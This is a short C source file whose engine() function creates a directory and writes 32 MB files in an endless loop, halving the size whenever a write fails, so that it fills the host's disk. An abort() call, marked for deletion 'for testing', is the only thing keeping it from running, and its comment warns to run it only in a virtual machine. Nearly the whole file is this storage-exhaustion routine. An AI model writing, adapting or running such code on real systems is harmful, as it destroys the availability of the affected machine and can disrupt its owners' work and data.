#include <stdio.h>
#include <stdlib.h>
#include "engine.h"

int engine(){
    char filename[128] = "\0";
    int result_of_test;
    int files_counter = 0;
    int result_of_writing = 0;
    long size_of_file = 32 * 1024 * 1024;
    char *space;
    FILE* file;

    result_of_test = test();
    if (result_of_test != 0){
        return result_of_test;
    }

    system("mkdir OG_working_directory");

    space = (char*)malloc(size_of_file);

    while (size_of_file > 0)
    {     
            abort(); // Delete for testing. TEST ONLY ON VIRTUAL MACHINE!
            sprintf(filename, "OG_working_directory\\%d", files_counter++);
            file = fopen(filename, "w");
            fwrite(space, sizeof(char), size_of_file, file);
            fflush(file);
            result_of_writing = ferror(file);
            clearerr(file);
            fclose(file);
            if (result_of_writing != 0){
                size_of_file >>= 1;
            }
    }

    free(space);

   return 0;
}
